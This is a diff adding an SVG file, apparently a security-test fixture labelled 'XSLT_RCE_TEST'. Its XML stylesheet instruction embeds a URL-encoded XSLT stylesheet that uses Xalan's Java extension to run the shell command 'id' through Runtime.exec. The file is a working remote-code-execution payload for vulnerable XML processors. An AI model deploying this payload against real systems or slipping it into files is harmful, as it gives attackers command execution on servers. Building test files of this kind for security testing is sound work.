@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" href="data:text/xml,
+  %3Cxsl:stylesheet%20version='1.0'%20xmlns:xsl='http://www.w3.org/1999/XSL/Transform'
+  %20xmlns:rt='http://xml.apache.org/xalan/java/java.lang.Runtime'%3E
+  %3Cxsl:template%20match='/'%3E
+  %3Cxsl:variable%20name='rtObj'%20select='rt:getRuntime()'//%3E
+  %3Cxsl:variable%20name='process'%20select='rt:exec($rtObj,&quot;id&quot;)'//%3E
+  %3C/xsl:template%3E
+  %3C/xsl:stylesheet%3E"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <rect width="200" height="200" fill="green"/>
+  <text x="10" y="50">XSLT_RCE_TEST</text>
+</svg>
